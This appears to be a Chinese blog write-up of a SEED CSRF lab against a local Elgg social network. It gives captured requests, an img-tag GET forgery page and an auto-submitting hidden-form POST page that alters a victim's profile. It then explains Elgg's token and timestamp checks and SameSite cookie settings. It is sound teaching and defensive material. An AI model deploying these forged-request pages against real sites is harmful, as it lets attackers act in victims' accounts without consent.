---
title: Web安全-CSRF
date: 2026-03-30
categories: Web安全
toc: true 
---

CSRF 攻击涉及受害用户、受信任站点和恶意站点。当受害者在访问恶意站点时，恶意站点的网页就有机会向受信任站点发出 HTTP 请求，导致损害。
本实验使用 CSRF 攻击来攻击一个社交网络 Web 应用程序 Elgg。已经关闭了 Elgg 中的一些防护措施以进行本实验。

<!--more-->

## 实验环境搭建

```bash
dcbuild
dcup
# 关闭实验环境
dcdown
```

已经搭建好三个网站
```
www.seed-server.com  社交网站
www.attack32.com  攻击者的恶意站点
www.example32.com  防御任务
```



## CSRF 攻击

### GET 请求伪造

要求实现 Alice 点击恶意网址，通过 GET 请求添加 Samy 为好友。

首先抓取正常添加好友的包

```http
GET /action/friends/add?friend=59&__elgg_ts=1776578914&__elgg_token=FHYQdycIHyjjFS58mT4jYg&__elgg_ts=1776578914&__elgg_token=FHYQdycIHyjjFS58mT4jYg HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
Cookie: Elgg=rr8tjm9onv17arr959on2v0k11; elggperm=zFtzXo5UkFOV4awdzuJ1QRF6IfAZ9kvT

HTTP/1.1 200 OK
Date: Sun, 19 Apr 2026 06:08:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Cache-Control: must-revalidate, no-cache, no-store, private
expires: Thu, 19 Nov 1981 08:52:00 GMT
pragma: no-cache
x-content-type-options: nosniff
Vary: User-Agent
Content-Length: 386
Keep-Alive: timeout=5, max=15
Connection: Keep-Alive
Content-Type: application/json; charset=UTF-8
```

这里实际上是有 token 和 ts 时间戳的，但是后端已经关闭了 CSRF 防护，这个在防御任务再说。

利用 `img` 标签，在浏览器加载恶意网站时解析图片，向社交网站发添加好友的 GET 请求。

如果 Alice 已经登录社交网站，浏览器自动填充 Cookie

```html
<html>
<body>
<h1>HTTP GET CSRF</h1>
<img src="http://www.seed-server.com/action/friends/add?friend=59">
</body>
</html>
```

```
http://www.attacker32.com/addfriend.html
```


抓取这个过程的包：

![image-20260419143316974](../assets/img/Web%E5%AE%89%E5%85%A8-CSRF/1.png)

虽然返回的是 302 ，资源重定向，但是 Alice 已经成功添加 Samy 为好友。


### POST 请求伪造

这个任务要求 Alice 点击恶意网站时发送 POST 请求，修改自我介绍为 ‘Samy 是我的英雄’

先抓一个正常修改自我介绍的包：


```
POST /action/profile/edit HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------10023647099898263611936076922
Content-Length: 2988
Origin: http://www.seed-server.com
Connection: keep-alive
Referer: http://www.seed-server.com/profile/alice/edit
Cookie: Elgg=nmp4i2mms8ik1nrklncl4se7or; elggperm=zZ8CAyfli1D875G8rerlif2J104uy-a0
Upgrade-Insecure-Requests: 1

-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="__elgg_token"

NgJxFuN_CCYJMKi6tRUdMQ
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="__elgg_ts"

1776580430
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="name"

Alice
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="description"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[description]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="briefdescription"


Samy is my hero
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[briefdescription]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="location"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[location]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="interests"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[interests]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="skills"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[skills]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="contactemail"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[contactemail]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="phone"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[phone]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="mobile"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[mobile]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="website"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[website]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="twitter"


-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="accesslevel[twitter]"

2
-----------------------------10023647099898263611936076922
Content-Disposition: form-data; name="guid"

56
-----------------------------10023647099898263611936076922--
```

这里看着有点乱，使用 `multipart/form-data` 和 boundary 分隔符 POST 表单，关键字段：

姓名还是能不改就不改

- `briefdescription`: Samy is my hero
- `accesslevel[briefdescription]` : 2 表示公开可见
- `guid`: 56

下面是攻击者恶意网站的页面：

```html
<html>
<body>
<h1>HTTP POST CSRF</h1>
<script type="text/javascript">
function forge_post()
{
  var fields;
  // 下面是攻击者需要填写的表单输入项。这些条目是隐藏的，受害者看不到。
  fields += "<input type='hidden' name='name' value='Alice'>";
  fields += "<input type='hidden' name='briefdescription' value='Samy is my hero'>";
  fields += "<input type='hidden' name='accesslevel[briefdescription]'value='2'>";
  fields += "<input type='hidden' name='guid' value='56'>";

  // 创建一个 <form> 元素。
  var p = document.createElement("form");

  // 构造表单
  p.action = "http://www.seed-server.com/action/profile/edit";
  p.innerHTML = fields;
  p.method = "post";

  // 将表单添加到当前页面中。
  document.body.appendChild(p);

  // 提交表单
  p.submit();
}

// 页面加载后会调用 forge_post() 函数。
window.onload = function() { forge_post();}
</script>
</body>
</html>

```
在点击恶意网址时，可以看到 POST 了一个请求，然后重定向到 Alice 主页，可以看到自我介绍部分已经被修改成功

![image-20260419145123309](../assets/img/Web%E5%AE%89%E5%85%A8-CSRF/2.png)

## CSRF 防御

CSRF 本质是后端无法区分哪些请求来自用户，哪些请求来自恶意网站。

防御策略：

- 应用层：将 secret token 嵌入页面，每次请求鉴别 token，而不让攻击者获取 token，以此识别正常用户和攻击者。并使用时间戳 Timestamp 防重放攻击

- 浏览器层：使用同源 Cookie，仅当请求来自受信任的网站时才自动填充 Cookie 到请求

### token + ts

#### 实现

首先在前端合法页面中，服务器会动态生成一个 token 和 ts，嵌入到所有表单中：

```php
$ts = time();
$token = elgg()->csrf->generateActionToken($ts);

echo elgg_view('input/hidden', ['name' => '__elgg_token', 'value' => $token]);
echo elgg_view('input/hidden', ['name' => '__elgg_ts', 'value' => $ts]);
```

token 和 ts 通过 JS 变量暴露：

```javascript
elgg.security.token.__elgg_ts;
elgg.security.token.__elgg_token;
```

每次提交表单时，这些参数会随请求一起发送到服务器

```
<input type = "hidden" name = "__elgg_ts" value = "" />
<input type = "hidden" name = "__elgg_token" value = "" />
```



令牌生成：会话密钥、时间戳的哈希值

```php
public function generateActionToken($timestamp, $session_token = '') {
    if (!$session_token) {
        $session_token = $this->session->get('__elgg_session');
        if (!$session_token) {
            return false;
        }
    }
    return $this->hmac->getHmac([(int) $timestamp, $session_token], 'md5')->getToken();
}
```



令牌验证：检查 token 是否匹配当前会话、检查时间戳是否有效期内，并通过触发钩子允许插件进一步检查

![image-20260419154610587](../assets/img/Web%E5%AE%89%E5%85%A8-CSRF/3.png)

检查时间戳：

```php
protected function validateTokenTimestamp($ts) {
    $timeout = $this->getActionTokenTimeout();
    $now = $this->getCurrentTime()->getTimestamp();
    return ($timeout == 0 || ($ts > $now - $timeout) && ($ts < $now + $timeout));
}

public function getActionTokenTimeout() {
    // default to 2 hours
    $timeout = 2;
    if ($this->config->hasValue('action_token_timeout')) {
        // timeout set in config
        $timeout = $this->config->action_token_timeout;
     }
	$hour = 60 * 60;
    return (int) ((float) $timeout * $hour);
}
```

检查是否匹配当前对话

```php
public function validateTokenOwnership($token, $timestamp, $session_token = '') {
    $required_token = $this->generateActionToken($timestamp, $session_token);
    return $this->crypto->areEqual($token, $required_token);
}
```



#### 实验

删去 `return;` 一行，这时候再点击恶意网址，发现加载不出来，返回主页，这时候突然弹出一堆 missing token or ts 弹窗，也没有被加好友或者修改主页，说明防御措施有效。

![image-20260419145519233](../assets/img/Web%E5%AE%89%E5%85%A8-CSRF/4.png)



### 同源 Cookie

浏览器还支持同源 Cookie 机制，通过标记 Cookie 为同源，阻止任何跨站请求使用 session ID

实验创建网站 `example32.com` 并设置了三个 Cookie：

- cookie-normal
- cookie-lax
- cookie-strict

对于同源请求，毫无疑问可以正常使用



对于三个测试：

1. GET link
2. GET form
3. POST form

都能成功显示出 cookie



对于跨域请求：

1. GET link 的跨域请求 normal 和 lax 可以使用 cookie

![image-20260419145834770](../assets/img/Web%E5%AE%89%E5%85%A8-CSRF/5.png)

2. GET form 的跨域请求 normal 和 lax 可以使用 cookie

![image-20260419145848243](../assets/img/Web%E5%AE%89%E5%85%A8-CSRF/6.png)

3. POST form 的跨域请求只有 normal 能用 cookie 

![image-20260419145901259](../assets/img/Web%E5%AE%89%E5%85%A8-CSRF/7.png)





下面是 ELgg 对于 Cookie 的定义部分：

一共使用两个 Cookie：

- PHP Session Cookie
- Extend Login Cookie（记住我 Cookie）

原本下面全部被注释掉，Elgg 正常使用 php.ini 中的设置，通过取消注释，重写设置。

```php
/**
 * Cookie configuration
 *
 * Elgg uses 2 cookies: a PHP session cookie and an extended login cookie
 * (also called the remember me cookie). See the PHP manual for documentation on
 * each of these parameters. Possible options:
 *
 *  - Set the session name to share the session across applications.
 *  - Set the path because Elgg is not installed in the root of the web directory.
 *  - Set the secure option to true if you only serve the site over HTTPS.
 *  - Set the expire option on the remember me cookie to change its lifetime
 *
 * To use, uncomment the appropriate sections below and update for your site.
 *
 * @global array $CONFIG->cookies
 */
// get the default parameters from php.ini
$CONFIG->cookies['session'] = session_get_cookie_params();
$CONFIG->cookies['session']['name'] = "Elgg";
 optionally overwrite the defaults from php.ini below
$CONFIG->cookies['session']['path'] = "/";
$CONFIG->cookies['session']['domain'] = "";
// $CONFIG->cookies['session']['secure'] = false;    // 必须配合 HTTPS 使用
// $CONFIG->cookies['session']['httponly'] = false;  // 防护 XSS

$CONFIG->cookies['session']['samesite'] = "Lax";  // 启用同源 Cookie

// extended session cookie
$CONFIG->cookies['remember_me'] = session_get_cookie_params();
$CONFIG->cookies['remember_me']['name'] = "elggperm";
$CONFIG->cookies['remember_me']['expire'] = strtotime("+30 days");
// optionally overwrite the defaults from php.ini below
$CONFIG->cookies['remember_me']['path'] = "/";
$CONFIG->cookies['remember_me']['domain'] = "";
// $CONFIG->cookies['remember_me']['secure'] = false;
// $CONFIG->cookies['remember_me']['httponly'] = false;

$CONFIG->cookies['session']['samesite'] = "Lax";  
```

samesite 的三个可选值：

| 值 | 含义 | 防护效果 | 对用户体验的影响 | 推荐场景 |
| --- | --- | --- | --- | --- |
| **Strict** | Cookie **完全不**随跨站请求发送（即使是点击链接跳转也不发送） | 最强防护，几乎完全阻挡 CSRF | 较差（从外部链接进入可能需重新登录） | 安全性要求极高的系统 |
| **Lax** | 默认值。允许**安全**的跨站 GET 请求（如点击链接），但阻止 POST、iframe 等 | 良好防护，能阻挡大多数 CSRF 攻击 | 较好（日常浏览基本不受影响） | **最推荐**（平衡安全与可用性） |
| **None** | 允许所有跨站请求发送（相当于没有 SameSite） | 几乎无防护 | 最佳（但不安全） | 只用于需要跨域的特殊场景 |



